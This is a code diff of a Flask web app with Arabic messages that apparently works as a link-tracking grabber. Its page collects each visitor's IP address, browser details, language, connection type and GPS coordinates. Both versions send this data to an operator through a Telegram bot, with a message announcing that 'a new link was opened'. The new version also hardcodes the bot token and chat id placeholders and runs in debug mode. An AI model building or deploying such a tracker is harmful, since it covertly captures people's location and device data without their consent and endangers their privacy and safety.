@@ -1,51 +1,41 @@
-from flask import Flask, request, jsonify, send_file
-import os
-import requests
-from dotenv import load_dotenv
+from flask import Flask, request, jsonify
+import telebot
 
-load_dotenv()
+bot = telebot.TeleBot("توكن البوت")
+chat_id = "معرّف الشات"
 
 app = Flask(__name__)
 
-TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
-
-if not TOKEN or not CHAT_ID:
-    raise Exception("يجب ضبط TELEGRAM_BOT_TOKEN و TELEGRAM_CHAT_ID في ملف .env")
-
-TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN}"
-
-@app.route("/")
+@app.route('/')
 def index():
-    return send_file("index.html")
+    return open("index.html", encoding="utf-8").read()
 
-@app.route("/send_client_info", methods=["POST"])
-def send_client_info():
-    data = request.get_json()
-    latitude = data.get("latitude")
-    longitude = data.get("longitude")
-    ip = data.get("ip")
-    user_agent = data.get("userAgent")
-    network_type = data.get("networkType")
-    timestamp = data.get("timestamp")
+@app.route('/get_ip')
+def get_ip():
+    return request.remote_addr
 
-    if not all([latitude, longitude, ip, user_agent, timestamp]):
-        return jsonify({"success": False, "error": "بيانات ناقصة"}), 400
-
-    message = (
-        f"📍 الموقع الجغرافي:\nخط العرض: {latitude}\nخط الطول: {longitude}\n\n"
-        f"🌐 عنوان IP: {ip}\n"
-        f"🖥️ نوع المتصفح: {user_agent}\n"
-        f"📡 نوع الشبكة: {network_type}\n"
-        f"⏰ الوقت: {timestamp}"
+@app.route('/report', methods=['POST'])
+def report():
+    data = request.json
+    msg = (
+        f"📡 تم دخول رابط جديد:\n\n"
+        f"🌐 IP: {data.get('ip')}\n"
+        f"🧠 الجهاز: {data.get('userAgent')}\n"
+        f"🗣 اللغة: {data.get('language')}\n"
+        f"🔌 الاتصال: {data.get('connection')}"
     )
+    bot.send_message(chat_id, msg)
+    return jsonify(status="ok")
 
-    resp = requests.post(f"{TELEGRAM_API_URL}/sendMessage", data={
-        "chat_id": CHAT_ID,
-        "text": message
-    })
+@app.route('/geo', methods=['POST'])
+def geo():
+    data = request.json
+    lat = data.get("lat")
+    lon = data.get("lon")
+    if lat and lon:
+        location_url = f"https://maps.google.com/?q={lat},{lon}"
+        bot.send_message(chat_id, f"📍 الموقع الجغرافي:\n{location_url}")
+    return jsonify(status="geo-ok")
 
-    if resp.status_code == 200:
-        return jsonify({"success": True})
-    else:
-        return jsonify({"success": False, "error": resp.text}), 500
+if __name__ == "__main__":
+    app.run(debug=True)
